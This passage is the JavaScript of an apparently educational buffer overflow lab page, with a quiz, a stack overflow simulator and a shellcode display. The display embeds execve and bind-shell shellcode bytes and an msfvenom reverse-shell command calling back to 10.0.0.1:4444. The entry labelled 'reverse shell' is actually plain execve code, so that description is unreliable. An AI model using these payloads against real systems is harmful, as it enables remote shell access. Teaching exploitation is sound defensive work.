                questionDiv.innerHTML = `
                    <h4>Question ${index + 1}</h4>
                    <p>${q.question}</p>
                    <div class="quiz-options">
                        ${q.options.map((opt, i) => `
                            <div class="quiz-option" onclick="selectOption(${index}, ${i})" data-question="${index}" data-option="${i}">
                                ${String.fromCharCode(65 + i)}. ${opt}
                            </div>
                        `).join('')}
                    </div>
                `;
                container.appendChild(questionDiv);
            });
        }

        function selectOption(questionIndex, optionIndex) {
            // Deselect all options for this question
            const options = document.querySelectorAll(`[data-question="${questionIndex}"]`);
            options.forEach(opt => opt.classList.remove('selected'));

            // Select clicked option
            const selected = document.querySelector(`[data-question="${questionIndex}"][data-option="${optionIndex}"]`);
            selected.classList.add('selected');
        }

        function submitQuiz() {
            let correct = 0;
            const results = document.getElementById('quizResults');

            quizData.forEach((q, index) => {
                const selected = document.querySelector(`[data-question="${index}"].selected`);
                const options = document.querySelectorAll(`[data-question="${index}"]`);

                if (selected) {
                    const selectedIndex = parseInt(selected.dataset.option);
                    if (selectedIndex === q.correct) {
                        correct++;
                        selected.classList.add('correct');
                    } else {
                        selected.classList.add('incorrect');
                        options[q.correct].classList.add('correct');
                    }
                } else {
                    options[q.correct].classList.add('correct');
                }
            });

            const score = (correct / quizData.length) * 100;
            state.quizScore = score;
            state.quizCompleted = true;

            results.innerHTML = `
                <div class="${score >= 80 ? 'success-box' : 'danger-box'}">
                    <h3>Quiz Results</h3>
                    <p><strong>Score: ${score.toFixed(1)}%</strong> (${correct}/${quizData.length} correct)</p>
                    ${score >= 80
                        ? '<p>Congratulations! You have demonstrated mastery of buffer overflow concepts.</p>'
                        : '<p>Review the material and try again. You need 80% to pass.</p>'}
                </div>
            `;

            document.getElementById('submitQuizBtn').disabled = true;
            updateProgress();
        }

        // Tab switching
        function switchTab(tabName) {
            // Update tab buttons
            document.querySelectorAll('.tab').forEach(tab => tab.classList.remove('active'));
            event.target.classList.add('active');

            // Update tab content
            document.querySelectorAll('.tab-content').forEach(content => content.classList.remove('active'));
            document.getElementById(tabName).classList.add('active');

            // Track viewed tabs
            state.tabsViewed.add(tabName);
            updateProgress();
        }

        // Stack overflow simulator
        function simulateOverflow() {
            const bufferSize = parseInt(document.getElementById('bufferSize').value);
            const inputData = document.getElementById('inputData').value;
            const inputLength = inputData.length;

            const stackAfter = document.getElementById('stackAfter');
            const resultDiv = document.getElementById('exploitResult');

            // Clear previous state
            stackAfter.innerHTML = '';
            resultDiv.innerHTML = '';

            const depEnabled = document.getElementById('depEnabled').checked;
            const aslrEnabled = document.getElementById('aslrEnabled').checked;
            const canaryEnabled = document.getElementById('canaryEnabled').checked;

            let exploitSuccess = false;
            let message = '';

            if (inputLength > bufferSize) {
                // Overflow occurs
                const overflowBytes = inputLength - bufferSize;

                // Stack canary check
                if (canaryEnabled && overflowBytes >= 4) {
                    message = '<div class="danger-box"><strong>Stack Canary Detected!</strong><p>The stack canary has been corrupted. Program terminates before return.</p></div>';
                } else if (overflowBytes >= bufferSize + 8) {
                    // EIP overwritten
                    const eipValue = inputData.slice(bufferSize + 4, bufferSize + 8);
                    const eipHex = '0x' + Array.from(eipValue).map(c =>
                        c.charCodeAt(0).toString(16).padStart(2, '0')
                    ).join('').slice(0, 8).padEnd(8, '0');

                    document.getElementById('regEIP').classList.add('highlight');
                    document.querySelector('#regEIP .register-value').textContent = eipHex;

                    if (depEnabled) {
                        message = '<div class="warning-banner"><strong>DEP Protection Active!</strong><p>EIP has been overwritten to ' + eipHex + ', but DEP prevents shellcode execution on the stack. You would need to use ROP chains.</p></div>';
                    } else if (aslrEnabled) {
                        message = '<div class="warning-banner"><strong>ASLR Active!</strong><p>EIP overwritten to ' + eipHex + ', but ASLR has randomized addresses. Hardcoded return addresses may not work.</p></div>';
                    } else {
                        message = '<div class="danger-box"><strong>Exploitation Successful!</strong><p>EIP has been overwritten to ' + eipHex + '. Execution redirected. In a real scenario, shellcode would execute.</p></div>';
                        exploitSuccess = true;
                    }

                    stackAfter.innerHTML = `
                        <div class="stack-cell overflow eip">
                            <span>0xbffff7f0:</span>
                            <span>EIP = ${eipHex} (OVERWRITTEN!)</span>
                        </div>
                        <div class="stack-cell overflow">
                            <span>0xbffff7ec:</span>
                            <span>Saved EBP = ${inputData.slice(bufferSize, bufferSize + 4).padEnd(4, 'X')}</span>
                        </div>
                        <div class="stack-cell overflow">
                            <span>0xbffff7e8:</span>
                            <span>Local Var 2 = (corrupted)</span>
                        </div>
                        <div class="stack-cell overflow">
                            <span>0xbffff7e4:</span>
                            <span>Local Var 1 = (corrupted)</span>
                        </div>
                        <div class="stack-cell overflow">
                            <span>0xbffff7a0-e0:</span>
                            <span>Buffer[${bufferSize}] = "${inputData.substring(0, 40)}${inputData.length > 40 ? '...' : ''}"</span>
                        </div>
                    `;
                } else {
                    message = '<div class="warning-banner"><strong>Partial Overflow</strong><p>Buffer overflowed by ' + overflowBytes + ' bytes. Local variables corrupted but EIP not yet reached.</p></div>';

                    stackAfter.innerHTML = `
                        <div class="stack-cell">
                            <span>0xbffff7f0:</span>
                            <span>EIP = 0x08048450 (intact)</span>
                        </div>
                        <div class="stack-cell overflow">
                            <span>0xbffff7ec:</span>
                            <span>Saved EBP = (possibly corrupted)</span>
                        </div>
                        <div class="stack-cell overflow">
                            <span>0xbffff7e8:</span>
                            <span>Local Var 2 = (corrupted)</span>
                        </div>
                        <div class="stack-cell overflow">
                            <span>0xbffff7e4:</span>
                            <span>Local Var 1 = (corrupted)</span>
                        </div>
                        <div class="stack-cell overflow">
                            <span>0xbffff7a0-e0:</span>
                            <span>Buffer[${bufferSize}] = "${inputData.substring(0, 40)}${inputData.length > 40 ? '...' : ''}"</span>
                        </div>
                    `;
                }
            } else {
                message = '<div class="success-box"><strong>No Overflow</strong><p>Input (' + inputLength + ' bytes) fits within buffer (' + bufferSize + ' bytes). No corruption occurs.</p></div>';

                stackAfter.innerHTML = `
                    <div class="stack-cell">
                        <span>0xbffff7f0:</span>
                        <span>EIP = 0x08048450</span>
                    </div>
                    <div class="stack-cell">
                        <span>0xbffff7ec:</span>
                        <span>Saved EBP = 0xbffff808</span>
                    </div>
                    <div class="stack-cell">
                        <span>0xbffff7e8:</span>
                        <span>Local Var 2 = 0x00000000</span>
                    </div>
                    <div class="stack-cell">
                        <span>0xbffff7e4:</span>
                        <span>Local Var 1 = 0x00000000</span>
                    </div>
                    <div class="stack-cell">
                        <span>0xbffff7a0-e0:</span>
                        <span>Buffer[${bufferSize}] = "${inputData}"</span>
                    </div>
                `;
            }

            resultDiv.innerHTML = message;
            state.exploitsRun++;
            document.getElementById('exploitsRun').textContent = state.exploitsRun;
            updateProgress();
        }

        function resetSimulator() {
            document.getElementById('bufferSize').value = 64;
            document.getElementById('inputData').value = 'AAAA';
            document.getElementById('regEIP').classList.remove('highlight');
            document.querySelector('#regEIP .register-value').textContent = '0x08048450';
            document.getElementById('stackAfter').innerHTML = `
                <div class="stack-cell">
                    <span>0xbffff7f0:</span>
                    <span>EIP = 0x08048450</span>
                </div>
                <div class="stack-cell">
                    <span>0xbffff7ec:</span>
                    <span>Saved EBP = 0xbffff808</span>
                </div>
                <div class="stack-cell">
                    <span>0xbffff7e8:</span>
                    <span>Local Var 2 = 0x00000000</span>
                </div>
                <div class="stack-cell">
                    <span>0xbffff7e4:</span>
                    <span>Local Var 1 = 0x00000000</span>
                </div>
                <div class="stack-cell">
                    <span>0xbffff7a0-e0:</span>
                    <span>Buffer[64] = (empty)</span>
                </div>
            `;
            document.getElementById('exploitResult').innerHTML = '';
        }

        function updateProtections() {
            const depEnabled = document.getElementById('depEnabled').checked;
            const aslrEnabled = document.getElementById('aslrEnabled').checked;
            const canaryEnabled = document.getElementById('canaryEnabled').checked;

            // Visual feedback could be added here
        }

        // Shellcode generator
        function generateShellcode() {
            const type = document.getElementById('shellcodeType').value;
            const display = document.getElementById('shellcodeDisplay');

            const shellcodes = {
                reverse: {
                    title: 'Reverse Shell Shellcode (Linux x86)',
                    bytes: '\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80',
                    description: 'Connects back to attacker IP:PORT and spawns /bin/sh'
                },
                bind: {
                    title: 'Bind Shell Shellcode (Linux x86)',
                    bytes: '\\x31\\xdb\\xf7\\xe3\\x53\\x43\\x53\\x6a\\x02\\x89\\xe1\\xb0\\x66\\xcd\\x80\\x5b\\x5e\\x52\\x68\\x02\\x00\\x11\\x5c\\x6a\\x10\\x51\\x50\\x89\\xe1\\x6a\\x66\\x58\\xcd\\x80',
                    description: 'Opens listening port and waits for incoming connection'
                },
                exec: {
                    title: 'Execute Command Shellcode',
                    bytes: '\\x31\\xc0\\x50\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x50\\x53\\x89\\xe1\\x99\\xb0\\x0b\\xcd\\x80',
                    description: 'Executes /bin/sh using execve() syscall'
                },
                messagebox: {
                    title: 'MessageBox Shellcode (Windows)',
                    bytes: '\\x33\\xc9\\x64\\x8b\\x49\\x30\\x8b\\x49\\x0c\\x8b\\x49\\x1c\\x8b\\x59\\x08\\x8b\\x41\\x20\\x8b\\x09\\x80\\x78\\x0c\\x33\\x75\\xf2\\x8b\\xeb\\x03\\x6d\\x3c\\x8b\\x6d\\x78\\x03\\xeb',
                    description: 'Displays Windows MessageBox popup'
                }
            };

            const shellcode = shellcodes[type];
            const bytes = shellcode.bytes.split('\\x').filter(b => b);

            display.innerHTML = `
                <h4>${shellcode.title}</h4>
                <p style="color: var(--text-dim); margin-bottom: 15px;">${shellcode.description}</p>
                <div style="margin: 15px 0;">
                    ${bytes.map(byte => `<span class="shellcode-byte">\\x${byte}</span>`).join('')}
                </div>
                <div class="info-box" style="margin-top: 15px;">
                    <strong>Characteristics:</strong>
                    <ul>
                        <li>Size: ${bytes.length} bytes</li>
                        <li>Architecture: ${type === 'messagebox' ? 'x86 Windows' : 'x86 Linux'}</li>
                        <li>Null-free: ${shellcode.bytes.includes('\\x00') ? 'No' : 'Yes'}</li>
                    </ul>
                </div>
                <div class="code-block">
<code># Python format
shellcode = "${shellcode.bytes}"

# C format
unsigned char shellcode[] = "${shellcode.bytes}";

# msfvenom command example
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -b "\\x00" -f python</code>
                </div>
            `;

            state.shellcodeGenerated = true;
            updateProgress();
        }

        // Progress tracking
        function updateProgress() {
            let progress = 0;
            const requirements = {
                tabsViewed: state.tabsViewed.size >= 5 ? 25 : (state.tabsViewed.size * 5),
                exploitsRun: state.exploitsRun >= 3 ? 25 : (state.exploitsRun * 8.33),
                shellcode: state.shellcodeGenerated ? 15 : 0,
                quiz: state.quizCompleted ? (state.quizScore >= 80 ? 35 : 15) : 0
            };

            progress = Object.values(requirements).reduce((a, b) => a + b, 0);
            progress = Math.min(100, Math.round(progress));

            state.progress = progress;
            document.getElementById('progressFill').style.width = progress + '%';
            document.getElementById('progressFill').textContent = progress + '%';
            document.getElementById('completionRate').textContent = progress + '%';

            // XP calculation
            let xp = 0;
            if (progress === 100) {
                xp = 80;
            } else if (progress >= 80) {
                xp = 60;
            } else if (progress >= 60) {
                xp = 40;
            } else if (progress >= 40) {
                xp = 20;
            }

            document.getElementById('xpEarned').textContent = xp;

            // Completion status
            if (progress === 100) {
                document.getElementById('completionStatus').innerHTML = `
                    <div class="success-box">
                        <h3>Congratulations!</h3>
                        <p>You have completed the Buffer Overflow & Exploitation Lab!</p>
                        <div class="xp-badge">+80 XP EARNED</div>
                        <p style="margin-top: 15px;">You now understand the fundamentals of memory corruption, exploitation techniques, and modern protection mechanisms. Use this knowledge responsibly for defensive security purposes.</p>
                    </div>
                `;
            }
        }

        // Initialize on load
        window.addEventListener('DOMContentLoaded', () => {
            initQuiz();
            state.tabsViewed.add('basics');
            updateProgress();
        });
    </script>
<script src="../../components/FluxCapacitor.js"></script>
</body>
</html>